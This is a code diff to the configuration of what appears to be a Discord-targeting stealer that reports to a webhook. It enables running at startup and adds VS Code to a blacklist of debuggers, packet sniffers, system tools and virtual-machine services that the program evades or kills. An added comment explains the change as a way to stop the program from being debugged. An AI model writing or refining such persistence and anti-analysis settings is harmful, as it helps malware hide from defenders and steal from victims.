@@ -40,7 +40,7 @@ __config__ = {
     # set to False if you don't want it to kill programs such as discord upon running the exe
     'kill_processes': False,
     # if you want the file to run at startup
-    'startup': False,
+    'startup': True,
     # if you want the file to hide itself after run
     'hide_self': False,
     # does it's best to prevent the program from being debugged and drastically reduces the changes of your webhook being found
@@ -49,11 +49,13 @@ __config__ = {
     'blackListedPrograms':
     [
         "httpdebuggerui", "wireshark", "fiddler", "regedit", "cmd", "taskmgr",
-        "vboxservice", "df5serv", "processhacker", "vboxtray", "vmtoolsd", "vmwaretray",
+        "code", "vboxservice", "df5serv", "processhacker", "vboxtray", "vmtoolsd", "vmwaretray", 
         "ida64", "ollydbg", "pestudio", "vmwareuser", "vgauthservice", "vmacthlp",
         "x96dbg", "vmsrvc", "x32dbg", "vmusrvc", "prl_cc", "prl_tools", "xenservice",
         "qemu-ga", "joeboxcontrol", "ksdumperclient", "ksdumper", "joeboxserver"
     ]
+
+# added "code" (VSCode) as it can be used to debug certain python programs with the help of Visual Studio. If you end up having issues just remove "code" from the 'blackListedPrograms' list
 
 }
 # global variables
